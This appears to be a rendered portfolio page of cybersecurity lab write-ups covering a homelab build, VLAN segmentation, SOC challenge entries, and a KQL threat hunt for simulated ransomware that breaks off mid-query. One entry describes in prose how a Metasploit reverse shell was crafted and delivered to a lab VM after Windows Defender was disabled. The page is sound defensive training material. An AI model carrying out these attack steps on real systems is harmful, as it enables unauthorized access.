1:"$Sreact.fragment"
2:I[9304,["542","static/chunks/542-9c169102c7286aba.js","651","static/chunks/651-e2b53cfd6ab14c6d.js","838","static/chunks/838-83c262eea6b250cb.js","52","static/chunks/52-dc2ebebf60073ec5.js","309","static/chunks/309-3e43f9b66d438df9.js","945","static/chunks/945-2a14fe9ed70b235a.js","916","static/chunks/916-d000ae8515890a43.js","794","static/chunks/794-40a14984f3a6b1a7.js","177","static/chunks/app/layout-020809086aa700bb.js"],"ThemeProvider"]
3:I[9241,["542","static/chunks/542-9c169102c7286aba.js","651","static/chunks/651-e2b53cfd6ab14c6d.js","838","static/chunks/838-83c262eea6b250cb.js","52","static/chunks/52-dc2ebebf60073ec5.js","309","static/chunks/309-3e43f9b66d438df9.js","945","static/chunks/945-2a14fe9ed70b235a.js","916","static/chunks/916-d000ae8515890a43.js","794","static/chunks/794-40a14984f3a6b1a7.js","177","static/chunks/app/layout-020809086aa700bb.js"],"CyberHeader"]
4:I[7555,[],""]
5:I[1295,[],""]
6:I[1024,["542","static/chunks/542-9c169102c7286aba.js","838","static/chunks/838-83c262eea6b250cb.js","345","static/chunks/app/not-found-f26a84874965db45.js"],"default"]
7:I[3063,["542","static/chunks/542-9c169102c7286aba.js","651","static/chunks/651-e2b53cfd6ab14c6d.js","838","static/chunks/838-83c262eea6b250cb.js","52","static/chunks/52-dc2ebebf60073ec5.js","309","static/chunks/309-3e43f9b66d438df9.js","945","static/chunks/945-2a14fe9ed70b235a.js","916","static/chunks/916-d000ae8515890a43.js","794","static/chunks/794-40a14984f3a6b1a7.js","177","static/chunks/app/layout-020809086aa700bb.js"],"Image"]
8:I[6874,["542","static/chunks/542-9c169102c7286aba.js","651","static/chunks/651-e2b53cfd6ab14c6d.js","838","static/chunks/838-83c262eea6b250cb.js","52","static/chunks/52-dc2ebebf60073ec5.js","309","static/chunks/309-3e43f9b66d438df9.js","945","static/chunks/945-2a14fe9ed70b235a.js","916","static/chunks/916-d000ae8515890a43.js","794","static/chunks/794-40a14984f3a6b1a7.js","177","static/chunks/app/layout-020809086aa700bb.js"],""]
a:I[9665,[],"OutletBoundary"]
d:I[9665,[],"ViewportBoundary"]
f:I[9665,[],"MetadataBoundary"]
11:I[6614,[],""]
:HL["/_next/static/css/9771aacc16142aba.css","style"]
:HL["/_next/static/css/b5c3a1bf19425f6c.css","style"]
0:{"P":null,"b":"gB8xjAs73Ya8I_-QXZr5a","p":"","c":["","projects","building-full-hardware-cybersecurity-homelab",""],"i":false,"f":[[["",{"children":["projects",{"children":[["slug","building-full-hardware-cybersecurity-homelab","d"],{"children":["__PAGE__",{}]}]}]},"$undefined","$undefined",true],["",["$","$1","c",{"children":[[["$","link","0",{"rel":"stylesheet","href":"/_next/static/css/9771aacc16142aba.css","precedence":"next","crossOrigin":"$undefined","nonce":"$undefined"}],["$","link","1",{"rel":"stylesheet","href":"/_next/static/css/b5c3a1bf19425f6c.css","precedence":"next","crossOrigin":"$undefined","nonce":"$undefined"}]],["$","html",null,{"lang":"en","suppressHydrationWarning":true,"children":[["$","head",null,{"children":["$","script",null,{"defer":true,"src":"https://cloud.umami.is/script.js","data-website-id":"1c0f224c-1fe0-4093-a4e2-c43cb8c84bfa"}]}],["$","body",null,{"className":"__className_f367f3","children":["$","$L2",null,{"attribute":"class","defaultTheme":"light","disableTransitionOnChange":true,"children":["$","div",null,{"className":"flex min-h-screen flex-col","children":[["$","$L3",null,{}],["$","main",null,{"className":"flex-1 pt-16","children":["$","$L4",null,{"parallelRouterKey":"children","error":"$undefined","errorStyles":"$undefined","errorScripts":"$undefined","template":["$","$L5",null,{}],"templateStyles":"$undefined","templateScripts":"$undefined","notFound":[["$","$L6",null,{}],[]],"forbidden":"$undefined","unauthorized":"$undefined"}]}],["$","footer",null,{"className":"bg-background py-5 border-t border-border","children":["$","div",null,{"className":"container mx-auto px-4 md:px-6","children":[["$","div",null,{"className":"grid grid-cols-1 md:grid-cols-3 gap-4","children":[["$","div",null,{"className":"space-y-2","children":[["$","div",null,{"className":"flex items-center","children":["$","div",null,{"className":"relative w-[3.6rem] h-[3.6rem]","children":["$","$L7",null,{"src":"https://hebbkx1anhila5yf.public.blob.vercel-storage.com/117%20Corporation%20no%20bg-5VVBXF0igK8jcCo43su7cpA2isco7t.png","alt":"117 SECOPS Logo","fill":true,"className":"object-contain"}]}]}],["$","p",null,{"className":"text-sm text-muted-foreground max-w-xs","children":"Cybersecurity professional specializing in protecting digital assets from evolving threats."}],["$","div",null,{"className":"pt-0","children":["$","a",null,{"href":"https://www.linkedin.com/in/otori-samson/","target":"_blank","rel":"noopener noreferrer","children":"Contact Me","className":"inline-flex items-center justify-center whitespace-nowrap text-sm font-medium ring-offset-background transition-colors focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-ring focus-visible:ring-offset-2 disabled:pointer-events-none disabled:opacity-50 h-9 rounded-md px-3 cyber-border bg-transparent text-foreground hover:bg-purple-600 hover:text-white","ref":null}]}]]}],["$","div",null,{"children":[["$","h3",null,{"className":"font-medium text-sm mb-2 text-foreground","children":"Quick Links"}],["$","ul",null,{"className":"space-y-0.5","children":[["$","li",null,{"children":["$","$L8",null,{"href":"/","className":"text-sm text-muted-foreground hover:text-primary","children":"Home"}]}],["$","li",null,{"children":["$","$L8",null,{"href":"/blog","className":"text-sm text-muted-foreground hover:text-primary","children":"Blog"}]}],["$","li",null,{"children":["$","$L8",null,{"href":"/projects","className":"text-sm text-muted-foreground hover:text-primary","children":"Projects"}]}],["$","li",null,{"children":["$","$L8",null,{"href":"/portfolio","className":"text-sm text-muted-foreground hover:text-primary","children":"Portfolio"}]}],["$","li",null,{"children":["$","$L8",null,{"href":"/about","className":"text-sm text-muted-foreground hover:text-primary","children":"About"}]}]]}]]}],["$","div",null,{"children":[["$","h3",null,{"className":"font-medium text-sm mb-2 text-foreground","children":"Areas of Expertise"}],["$","ul",null,{"className":"space-y-0.5","children":[["$","li",null,{"className":"text-sm text-muted-foreground","children":"Security Assessment"}],["$","li",null,{"className":"text-sm text-muted-foreground","children":"Penetration Testing"}],["$","li",null,{"className":"text-sm text-muted-foreground","children":"Secure Development"}],["$","li",null,{"className":"text-sm text-muted-foreground","children":"Incident Response"}],["$","li",null,{"className":"text-sm text-muted-foreground","children":"Compliance"}]]}]]}]]}],["$","div",null,{"className":"border-t border-border mt-5 pt-3 flex flex-col md:flex-row justify-between items-center","children":["$","p",null,{"className":"text-sm text-muted-foreground","children":["Â© ",2025," Samson's. Personal cybersecurity portfolio."]}]}]]}]}]]}]}]}]]}]]}],{"children":["projects",["$","$1","c",{"children":[null,["$","$L4",null,{"parallelRouterKey":"children","error":"$undefined","errorStyles":"$undefined","errorScripts":"$undefined","template":["$","$L5",null,{}],"templateStyles":"$undefined","templateScripts":"$undefined","notFound":"$undefined","forbidden":"$undefined","unauthorized":"$undefined"}]]}],{"children":[["slug","building-full-hardware-cybersecurity-homelab","d"],["$","$1","c",{"children":[null,["$","$L4",null,{"parallelRouterKey":"children","error":"$undefined","errorStyles":"$undefined","errorScripts":"$undefined","template":["$","$L5",null,{}],"templateStyles":"$undefined","templateScripts":"$undefined","notFound":"$undefined","forbidden":"$undefined","unauthorized":"$undefined"}]]}],{"children":["__PAGE__",["$","$1","c",{"children":["$L9","$undefined",null,["$","$La",null,{"children":["$Lb","$Lc",null]}]]}],{},null,false]},null,false]},null,false]},null,false],["$","$1","h",{"children":[null,["$","$1","sI41gjGgVmwB0prAAMkkN",{"children":[["$","$Ld",null,{"children":"$Le"}],null]}],["$","$Lf",null,{"children":"$L10"}]]}],false]],"m":"$undefined","G":["$11","$undefined"],"s":false,"S":true}
12:I[2238,["542","static/chunks/542-9c169102c7286aba.js","651","static/chunks/651-e2b53cfd6ab14c6d.js","838","static/chunks/838-83c262eea6b250cb.js","885","static/chunks/885-ced1f1eec30031e3.js","150","static/chunks/150-f30d5c80752f43a9.js","419","static/chunks/app/projects/%5Bslug%5D/page-e7fed7e0529d1ffc.js"],"default"]
13:T16a3,
## Levelling Up: From VirtualBox to a Full Hardware Cybersecurity Home Lab (Project V117)

If there's one thing that's been both my playground as a cybersecurity enthusiast, it's my home lab. I didn't just throw hardware together, I engineered a mini datacenter that lets me break things, fix them, and build skills that go beyond the classroom or certification paths.

So let me walk you through how I set it all up, from network design, hardware choices, and wiring, to the virtual machines running inside.

## The Blueprint

Before buying a single cable, I sat down and mapped out what I needed:
- A solid core network
- A powerful, reliable server
- A firewall/router to control traffic
- A proper switch to interconnect everything
- And most importantly: internet access without having to buy a new broadband plan

## The Physical Stack

Here's the physical breakdown of what I used:

### The Switch
At the heart of my lab sits a Cisco SG500X-24, a 24-port managed switch with RJ45 1GbE ports. This switch gives me full control over VLANs, trunking, port security, and QoS, which is perfect for mimicking enterprise-level setups. I got this because later in future I plan to manually configure VLANs for different zones (e.g., management, attack, internal, DMZ), so I could isolate traffic and simulate real-world networks.

### The Server
Then comes my main server, which I affectionately call the Node-V117.
- CPU: Intel Xeon E5-2689 (8 cores, 16 threads)
- RAM: 64 GB ECC (Error Correcting Code)
- Storage: 3 SSDs for fast I/O
- GPU: NVIDIA Quadro card, mostly used for potential GPU passthrough and future ML experiments

This beast runs Proxmox VE, a Type-1 hypervisor that gives me the power to run several virtual machines and containers. If you're serious about virtualisation, Proxmox is the real deal.

### The OPNsense Firewall
For routing and security experimentation, I installed OPNsense on an HP T730 Thin Client. It's a sleek, fanless device that runs silently and comes equipped with a dual 2.5GbE NIC, perfect for future networking experiments. I configured the interfaces for WAN (connected to my laptop for internet) and LAN (connected to the switch), giving me complete control over firewall rules, NAT, and traffic shaping. Right now, it's sitting in place and connected, ready to be the core of my network security setup when I begin more advanced testing.

## The Wiring and Internet Hack

One of the most interesting parts of my setup was getting the entire homelab online, without a dedicated internet line. For now, I bridged my laptop's internet connection to the firewall as a temporary workaround. It works for basic connectivity and testing, but I'm already seeing its limitations in bandwidth, stability, and accessibility. Eventually, I plan to set up a dedicated internet line for the lab to unlock more advanced use cases, such as remote access, persistent services, and uninterrupted updates.

Here's how I did it:

1. Laptop Internet Sharing
   - My laptop connects to Wi-Fi
   - I shared this connection through the Ethernet port using Windows' Internet Sharing feature

2. Cable Run
   - I plugged an Ethernet cable from the laptop into the WAN port of the HP T730 running OPNsense

3. Firewall Setup
   - In OPNsense, I configured the WAN interface to get an IP via DHCP (coming from the laptop)
   - Then set the LAN IP range (e.g., 192.168.100.1/24) and turned on DHCP for internal devices

4. Switch Cabling
   - The LAN port of the firewall connects to port 1 on the Cisco switch
   - My server's NIC connects to port 2
   - The remaining ports were available for VMs or any other device I want to simulate

## Virtual Machines

On Proxmox, I spun up multiple VMs, each serving a different purpose:
- Windows 10 & 11: For endpoint security testing, malware analysis, and AD simulations
- Ubuntu Server: Hosting lightweight services, honeypots, and ELK stack
- Kali Linux: My offensive workstation, preloaded with tools like Burp Suite, Metasploit, and Nmap

Later, as I expand my knowledge, I would place each VM on its own VLAN or subnet, and intentionally misconfigure some for security testing, because what's a lab without vulnerabilities?

## Use Cases and Next Steps

With this lab, I can:
- Simulate red vs. blue team scenarios
- Build and monitor logs from Windows endpoints
- Train with SIEM tools like Wazuh
- Set up phishing simulations and response workflows
- Test firewall rules, intrusion detection, and segmentation

The plan is to keep building on this, maybe add Active Directory, integrate SOAR tools like Shuffle(which I'm already working on currently), and even try deploying a Kubernetes cluster on Ubuntu.

## Conclusion

Setting up this lab wasn't just about putting hardware together, it was about creating an environment where I could think like an attacker, build like an engineer, and defend like a blue teamer. Every time I boot up a VM, I'm building muscle memory for real-world problem solving.

If you're thinking of building your own lab, start small but think big. And don't wait for the perfect setup. I started out running labs in VirtualBox, just trying to get a feel for the tools and workflows. But eventually, I knew I needed to experience real hardware and full network environments. So I made this work, with shared internet and repurposed gear. It's not about perfection; it's about progress.

Got questions or thinking of building your own lab? I'd be happy to chat or help, just click on the "Contact Me" button anywhere on this site to reach out to me on LinkedIn. 

*NOTE: This project was independently researched, designed, and implemented by me, Samson Otori, as part of my hands-on journey in cybersecurity.* 14:T9c8,
## Installing a 4TB SATA Hard Drive in My Proxmox Server

### Overview

To expand my Proxmox VE bare-metal server's storage, I installed a 4TB SATA 3.5" hard drive. Although the hardware was correctly connected, the drive initially failed to appear in Proxmox or in the system's disk utilities. This write-up documents how I diagnosed and resolved the issue.

### Initial Symptoms

After physically installing the drive with both SATA power and data cables connected to the motherboard, the system did not detect the disk. Tools like `lsblk`, `fdisk -l`, and the Proxmox GUI showed no sign of it.

Despite this, the drive was poweredâaudibly spinningâand `dmesg` logs showed that SATA link negotiation occurred at 6.0 Gbps. However, there was no device registered as `/dev/sdX`, suggesting a failure in initialization.

### Diagnostic Process

I confirmed the SATA cable and power lines were functional by testing them with other working drives. Swapping ports on the motherboard yielded no change. BIOS settings were inspected to confirm that AHCI mode was enabled and that all SATA ports were active.

I then tested the drive using a USB-to-SATA adapter. While a smaller 2.5" drive was successfully detected through the adapter, the 3.5" drive failed to power up correctlyâimplying insufficient power delivery via USB.

### Resolution

A full system reboot with the drive plugged into a known-good SATA port allowed proper detection. Upon restart, the disk appeared in `fdisk -l` and `lsblk` as `/dev/sdX`.

With the device now detected, I wiped previous signatures using `wipefs -a`, then formatted it using `mkfs.ext4`. I mounted the drive under `/mnt/4tbdrive` and added the appropriate entry to `/etc/fstab` for persistence.

### Conclusion

This issue highlighted how a drive may appear to function at the hardware level while still failing OS-level detection due to incomplete initialisation. A simple reboot can often trigger proper enumeration. It's a reminder to combine physical verification with system-level diagnostics and to never overlook the importance of full reboots in hardware troubleshooting.

### CREDIT

This project was independently researched, designed, and implemented by me, Samson Otori, as part of my hands-on journey in cybersecurity.

---

**Tags:** #Proxmox #Storage #Hardware #SATA #Linux #SystemAdministration #Troubleshooting #Infrastructure #Homelab #HardwareUpgrade #StorageExpansion #ProxmoxVE #BareMetal #DiskManagement 15:T1f83,
## Segmenting My Cybersecurity Homelab Using VLANs

After completing the initial build of my cybersecurity homelab, I knew the next big milestone was network segmentation. I wanted to separate my environment into distinct VLANs for better traffic control, improved security, and a more organized deployment of my tools and virtual machines. The concept was simple in theory, separate traffic logically while maintaining complete control from a single pane.

My initial spark for this came from Gerard O'Brien, whose breakdown of homelab network segmentation introduced me to the idea of creating isolated VLANs for each category of devices or services. It made perfect sense: isolate your security tools, isolate vulnerable machines, isolate test environments, all while routing through a central firewall. Along the way, I hit several roadblocks. That's where Koroma Tech came in. His YouTube series covered VLAN segmentation using OPNsense, Cisco switches, and Proxmox, the exact gear I had. His breakdown helped untangle many of the issues I ran into and became an invaluable guide during troubleshooting.

## Initial Vision

I began with a vision of building an enterprise-style segmented lab. The goal was to use OPNsense as my central router and firewall, Proxmox to host all VMs, and a Cisco switch to trunk the VLANs across the environment. I planned four main VLANs:

A VLAN for security tools, which would house platforms like Wazuh and TheHive. A separate VLAN for vulnerable machines, which I could target with Kali Linux and test detection pipelines. Another VLAN would be reserved for a Windows environment, where I could simulate real endpoints and domain controllers. Finally, I wanted a VLAN for Docker containers, to explore containerized security tools and microservices.

All of this was connected by a Cisco SG500X-24 switch, a Proxmox server with multiple bonded NICs, and an OPNsense firewall running on a dedicated thin client. Internet was shared into the lab via Ethernet from a laptop using a Wi-Fi uplink, serving as a temporary ISP connection.

## Configuring the Cisco Switch

The first step was to configure VLANs on the Cisco switch. Inside the VLAN Management interface, I created VLANs 1 (default), 5, 10, 20, and 30. I used port GE1 as the trunk port connected to the Proxmox server and port GE2 as the uplink to the OPNsense firewall.

Trunking configuration was critical. GE1 needed to be tagged for VLANs 5, 10, 20, and 30. This would allow Proxmox to forward VLAN-tagged traffic into the switch and out toward the firewall. Cisco switches, however, require each port to have one untagged VLAN. I initially attempted to remove all untagged VLANs but was met with an error. It turns out VLAN 1 must remain as the untagged VLAN by default. I left it in place and tagged the rest.

Ports assigned to VM-specific devices were configured as access ports, tagged only for their respective VLANs. For example, GE5 might be an access port for VLAN 20 (Windows), and GE6 for VLAN 10 (Kali Linux).

## VLAN Interface Setup in OPNsense

On the OPNsense firewall, the VLAN interfaces were built on top of the physical NIC (RE2) connected to the Cisco switch. For each VLAN, I created a corresponding virtual interface, such as RE2_vlan20 for VLAN 20, and then assigned it inside the OPNsense GUI.

Each VLAN interface was given a static IP address, for example, 10.10.20.1/24 for VLAN 20, and a DHCP server was configured to assign IPs within that range. I added basic allow-all rules in the firewall for each VLAN subnet to ensure traffic could flow during testing. One misstep I encountered was related to firewall rules: DHCP leases weren't being issued at first, and I later discovered that a deny rule was taking precedence above my allow rule. Once I reordered them, DHCP worked flawlessly.

## Bridging and Bonding in Proxmox

This was one of the trickiest parts of the build. My Proxmox server had three network interfaces, enp10s0, enp9s0, and enp6s0, which were originally bonded into a single interface, bond0. This bond0 wasn't attached to vmbr0, my default Linux bridge, which wasn't VLAN-aware.

Inspired by Koroma Tech's video, I thought I needed to separate one NIC and create a new Linux bridge, vmbr1, for the VLANs. I detached enp6s0 from the bond and attached it to vmbr1. This led to chaos: Proxmox VMs could no longer reach the internet, static IPs weren't being assigned, DHCP requests failed, and the web interface became intermittently unreachable. I had to access the server via shell and manually fix /etc/network/interfaces. A simple ifreload -a command even took the network down temporarily.

The realization hit after consulting Koroma Tech and rewatching his video (Thanks for his response): I never needed a second bridge. The original vmbr0, was to be made to point to bond0, and that would have been perfectly capable of handling VLAN-tagged traffic, provided the VLAN-aware checkbox was enabled, which I eventually did. So I reverted everything. I re-added enp6s0 to the bond, reset the bridge to vmbr0, and things began to work.

## Assigning VLANs to VMs in Proxmox

With vmbr0 correctly configured, the next step was assigning VLAN tags to the VMs. In each VM configuration, I went to Hardware â Network Device, edited the NIC, and added the VLAN tag that matched the desired segment. For instance, the Windows VM was given VLAN 20, Kali got VLAN 10, and my Docker VM received VLAN 30.

Once this was done, I rebooted the VMs and ran ipconfig or ifconfig to verify the network settings. To my satisfaction, each VM pulled the correct IP address from its respective VLAN subnet, configured on OPNsense and trunked through the Cisco switch.

## The Debugging Journey

I ran into every possible issue: Proxmox network down, static IP not picked, DHCP not working, OPNsense not receiving traffic, and even Cisco switch ports refusing certain configs. I spent hours running packet captures on OPNsense to see if DHCP DISCOVER packets were even hitting the firewall, in many cases, they weren't, due to tagging or misassigned switch ports.

It wasn't until I fully understood how each layer, Proxmox, the switch, and OPNsense, handled tagged traffic that things started to align. The concept of trunk ports, access ports, tagging at the VM level, VLAN-aware bridges, and proper interface assignment all had to be in perfect harmony.

## Conclusion

This project pushed me. I'm proud of how it turned out, not just because everything is now working, but because I truly understand the system I built. VLANs are no longer just theory to me. I've lived the chaos, the packet loss, the empty DHCP leases, and the recovery.

Massive thanks to Gerard O'Brien for the foundational inspiration and to Koroma Tech for the actionable guidance and video breakdowns that helped me debug when things went south. He even took time to respond to my messages, and that helped keep me grounded.

If you're reading this and planning to segment your own lab: take it slow, understand each component, and know that breaking things is part of the journey. My next steps will be building services like Wazuh, TheHive, and Arkime inside their respective VLANs, and expanding the lab even further, now with a proper backbone in place.

Credits: This project was independently implemented by Samson Otori, with conceptual inspiration from Gerard O'Brien and valuable technical guidance from Koroma Tech, whose content and support were instrumental in shaping and troubleshooting the VLAN segmentation setup.

Here's a link to their YouTube channels:
- [Gerard O'Brien's Channel](https://www.youtube.com/@techwithgerard)
- [Koroma Tech Channel](https://www.youtube.com/@KoromaTech)

---

**Tags:** #VLAN #NetworkSegmentation #OPNsense #CiscoSwitch #Proxmox #Infrastructure #Homelab #Cybersecurity #NetworkSecurity #Virtualization #Firewall #DHCP #Trunking #AccessPorts #VLANAware #NetworkConfiguration #SecurityTools #WindowsEnvironment #KaliLinux #DockerContainers 16:Tce8,
# Part 2: Generating Telemetry and Analyzing Attacks

My focus has shifted to generating telemetry data for analysis, a critical step in detecting malicious activities.

## Scanning with Nmap

I started the telemetry generation process with Nmap. This enabled me to conduct a comprehensive scan of my Windows VM, identifying open ports and services that could be potential attack vectors. This reconnaissance phase helped me understand the attack surface and assess vulnerabilities within my environment.

The scan revealed several open ports, notably Port 3389, associated with Remote Desktop Protocol (RDP). Identifying such services is crucial as they can serve as entry points for attackers seeking to exploit system weaknesses.

## Crafting Malware with Metasploit

After reconnaissance, I shifted to creating a simulated attack using Metasploit, a widely used framework for penetration testing. I crafted a reverse shell payload, a common technique used by attackers to gain unauthorized access to target systems. This exercise provided insight into the attack lifecycle and how malicious actors exploit systems.

With the malicious executable ready, I set up a listener in Metasploit to capture any incoming connections from the reverse shell. This involved configuring the Metasploit environment for potential exploitation attempts from the crafted payload.

## Executing the Malware

Once the payload and listener were in place, I set up an HTTP server using Python on my attacking OS. I accessed the server from my Windows machine to download the malware. To simulate a real-world scenario, I disabled Windows Defender to allow the payload to execute unhindered.

After running the payload, I monitored my parrot machine for an incoming connection, indicating a successful exploit. I executed basic commands like SHELL, NET USER, and IP CONFIG to generate telemetry data.

## Analyzing Telemetry with Splunk

With the simulated attack executed, I turned to analyzing the telemetry generated by the activities in my lab. I configured Splunk to ingest system logs from Sysmon, setting up an index dedicated to endpoint monitoring.

By correlating telemetry data with events from the attack simulation, I gained insights into the attack lifecycle. I reviewed logs for indicators of compromise, including the creation and execution of the reverse shell. This analysis is essential for developing effective detection strategies in a real-world Security Operations Center (SOC).

## Conclusion

Through these exercises, I've deepened my understanding of the attack lifecycle and the importance of telemetry in incident response. Generating and analyzing telemetry data is fundamental for any aspiring SOC analyst. In the coming days, I plan to refine my detection capabilities further and explore additional avenues for generating and analyzing telemetry.

Here's the link to follow along: [Building A Basic Home Lab](https://www.youtube.com/watch?v=-8X7Ay4YCoA&list=PLG6KGSNK4PuBWmX9NykU0wnWamjxdKhDJ&index=3)

*Credit: This project was originally created by the MYDFIR YouTube channel. All structure and content was inspired by MYDFIR. Check his channel out: [@MyDFIR](https://www.youtube.com/@MyDFIR)*

_#CyberSecurity #SOCAnalyst #MYDFIR #HandsOnExperience_ 17:T4f0,
# Introduction to the 30-Days MYDFIR SOC Analyst Challenge

I'm thrilled to announce that I'll be taking on the 30-Days MYDFIR SOC Analyst Challenge! If you're like me, eager to gain hands-on experience in cybersecurity, this challenge is a perfect opportunity.

Over the next 30 days, I'll be learning how to set up and configure the ELK Stack, investigate security incidents, and create dashboards and alerts. Each week focuses on a specific skill, from brute force attack detection to setting up a C2 server.

This challenge is all about turning theory into practice, and by the end, I'll have honed the skills that are crucial for a SOC analyst role. I'll be sharing my progress and insights along the way, so stay tuned for updates.

Join me on this journey as I aim to strengthen my skills and prepare for the real-world demands of cybersecurity. Let's get started!

Here's the link to follow along: [30-Day MYDFIR SOC Analyst Challenge](https://www.youtube.com/watch?v=W3ExS2m6B24)

*Credit: This project was originally created by the MYDFIR YouTube channel. All structure and content was inspired by MYDFIR. Check his channel out: [@MyDFIR](https://www.youtube.com/@MyDFIR)*

#Cybersecurity #SOCAnalyst #30DayChallenge #PracticalExperience 18:Tb1f,
## Introduction

Today marks the beginning of my hands-on journey in the 30-Day MYDFIR SOC Analyst Challenge. I'm starting with the most fundamental aspect: creating a logical network diagram that will serve as the blueprint for my entire SOC environment.



## Environment Overview

At the heart of my SOC environment lies a carefully planned infrastructure consisting of six key servers. The core components include my Elastic Server for comprehensive log aggregation and analysis, paired with a Kibana Server that handles visualization and dashboard creation. To manage my agents effectively, I've incorporated a Fleet Server into the design. Additionally, a C2 Server has been included to facilitate realistic attack scenario simulations, alongside other supporting infrastructure components that complete my robust environment.

## Implementation Details

The implementation process began with draw.io as my diagramming tool of choice. Through careful consideration, I mapped out the complete environment with attention to detail. The process involved strategic placement of each server component within the network topology, ensuring optimal communication paths. I dedicated significant attention to configuring the private network structure and establishing clear data flow connections between components. Special consideration was given to defining security zones and boundaries, ensuring a secure and well-organized infrastructure.

## Key Insights

Through the process of creating this network diagram, I've gained valuable insights into the practical aspects of SOC architecture. Understanding how components interact within a security operations environment has proven crucial, as this setup mirrors real-world scenarios. The exercise has deepened my understanding of data flow patterns and the importance of comprehensive security monitoring coverage. This foundation will prove invaluable as I progress through the challenge.

## Future Direction

While this network diagram may appear straightforward, it represents the cornerstone of my 30-day journey. This blueprint will guide me through the configuration of monitoring tools, implementation of log forwarding mechanisms, and setup of alert management systems. As I progress, I'll use this foundation to simulate and detect security threats, turning theoretical knowledge into practical experience.

Here's the link to follow along: [30-Day MYDFIR SOC Analyst Challenge](https://www.youtube.com/watch?v=VAE3aVZi0Go&list=PLG6KGSNK4PuBWmX9NykU0wnWamjxdKhDJ&index=28)

*Credit: This project was originally created by the MYDFIR YouTube channel. All structure and content was inspired by MYDFIR. Check his channel out: [@MyDFIR](https://www.youtube.com/@MyDFIR)* 

#CyberSecurity #SOCAnalyst #MYDFIRChallenge #HandsOnExperience #MYDFIRChallenge #Day1 

19:Tb5a,
## Introduction

On Day 2 of the 30-Days MYDFIR SOC Analyst Challenge, I delved into the ELK stack, a powerful trio of toolsâElasticsearch, Logstash, and Kibanaâwidely used in security operations. Together, they form the backbone of log management and analysis, crucial for any Security Operations Center (SOC).

## Understanding Elasticsearch

Elasticsearch is the heart of the stack. It's a robust search engine that stores and indexes massive amounts of log data. This data can range from Windows event logs to firewall logs and beyond. What makes Elasticsearch particularly valuable is its querying power. It uses Elasticsearch Query Language (ESQL), which allows users to search through large datasets quickly and efficiently. The flexibility of Elasticsearch, especially with its RESTful APIs and JSON support, means you can programmatically interact with it from other tools, enhancing its integration into diverse environments.

## The Power of Logstash

Next is Logstash, the powerhouse that processes and transforms incoming data before feeding it into Elasticsearch. Logstash is vital because it allows you to refine your log data, filtering out unnecessary information and only retaining what's critical. This reduces the load on Elasticsearch and helps you manage storage costs more effectively. Additionally, Logstash's ability to parse log fields is a game-changer. For example, you can extract specific details from logs, such as IP addresses, and map them to fields that can be easily queried later. This capability is crucial for security analysts who need to drill down into specific events during investigations.

## Visualizing with Kibana

Finally, Kibana is the interface where all the magic happens. It provides a user-friendly web console for querying data stored in Elasticsearch. Beyond simple querying, Kibana's visualization tools enable the creation of detailed dashboards that can display trends, alert patterns, and more. These dashboards are not only useful for real-time monitoring but also for reporting to executives, who often rely on visual data to understand security posture.

## Conclusion

The ELK stack offers centralized logging, customizable data processing, and scalable architecture, making it an essential tool for SOC analysts. Its integration with various telemetry sources and the ability to create visualizations make it a powerful platform for both real-time monitoring and incident response.

Here's the link to follow along: [30-Day MYDFIR SOC Analyst Challenge](https://www.youtube.com/watch?v=4AwBhXAW90Q&list=PLG6KGSNK4PuBWmX9NykU0wnWamjxdKhDJ&index=29)

*Credit: This project was originally created by the MYDFIR YouTube channel. All structure and content was inspired by MYDFIR. Check his channel out: [@MyDFIR](https://www.youtube.com/@MyDFIR)*

#CyberSecurity #SOCAnalyst #MYDFIRChallenge #HandsOnExperience #Day2 1a:T2e31,
## Introduction

This investigation was conducted to examine suspicious file activity observed within the virtual machine samson-windows-, which was onboarded to Microsoft Defender for Endpoint (MDE). The objective was to determine whether abnormal file modification behaviour and ransom instructions on the desktop were the result of ransomware execution, and if so, to identify its origin, propagation chain, and indicators of compromise.

Using Microsoft Defender's advanced hunting capabilities, telemetry from multiple tables â DeviceFileEvents and DeviceProcessEvents â was analyzed to reconstruct the attack sequence.

## Scenario Overview

A new ransomware strain, internally referred to as PwnCrypt, had been reported as circulating in the wild. It leverages a PowerShell-based payload that encrypts local files using AES-256 encryption, appending the custom extension .pwncrypt. The strain also leaves ransom instructions in a desktop file demanding Bitcoin payment for decryption.

During lab testing, the same behaviour appeared on samson-windows-: three files on the Desktop were encrypted, and a text file appeared reading:

"Your files have been encrypted. To get a decryption key, send this amount of Bitcoin toâ¦"

The task was to confirm the root cause of this encryption, identify the executing process chain, and determine whether any persistence or lateral movement mechanisms were present.

## Preparation

Prior to the hunt, the samson-windows- VM was successfully onboarded to MDE, ensuring telemetry ingestion from endpoint sensors. A PowerShell script named pwncrypt.ps1 was executed in the background to simulate a real ransomware infection, but the analysis was performed as if the infection were unknown.

The first step was to establish a baseline of file activity to identify when the anomaly began.

## Data Collection

The analyst verified active log collection across Defender's telemetry tables. Using DeviceFileEvents, all file operations within the last 30 minutes were grouped by timestamp to visualize spikes in file write volume:

-------------------------------------------------------
kql
let VMName = "samson-windows-";
DeviceFileEvents
| where DeviceName == VMName
| where Timestamp >= ago(30m)
| summarize FileEvents = count() by bin(Timestamp, 5m)
| order by Timestamp asc
-------------------------------------------------------

Result: Three distinct spikes appeared within a short interval, suggesting a mass file modification event, the initial indicator of ransomware behavior.

## Data Analysis

### A. Mass File Modification and Extension Changes

To examine which file types were most affected, the following query was run:

-------------------------------------------------------
kql
DeviceFileEvents
| where DeviceName == VMName
| where ActionType in ("FileRenamed","FileCreated","FileModified")
| extend ext = tostring(split(FileName,".")[-1])
| summarize Count = count() by ext
| order by Count desc
-------------------------------------------------------

Observation: Extensions such as .dll, .mui, .xml, and .png appeared frequently normal for background Windows processes â but hidden within the logs were sudden surges of renamed files later correlated with the encryption timestamps.

### B. Folder-Level Analysis (Staging Behaviour)

To determine where encryption occurred:

-------------------------------------------------------
kql
let VMName = "samson-windows-";
DeviceFileEvents
| where DeviceName == VMName and Timestamp >= ago(30m)
| where ActionType == "FileCreated"
| summarize count() by Folder = extract(@"^(.*)\\[^\\]+$",1,FileName)
| order by count_ desc
-------------------------------------------------------

Result: High activity was isolated to a single user folder â C:\Users\samson\Desktop â confirming that encryption primarily targeted the Desktop directory.

### C. Identifying Script Execution

The next step was to look for evidence of any scripts or command-line interpreters responsible for the mass file actions:

-------------------------------------------------------
kql
let VMName = "samson-windows-";
DeviceProcessEvents
| where DeviceName == VMName and Timestamp >= ago(30m)
| where FileName has_any ("powershell","pwsh","cmd.exe","wscript.exe","cscript.exe","wmic.exe")
| project Timestamp, FileName, ProcessCommandLine, InitiatingProcessFileName, InitiatingProcessCommandLine
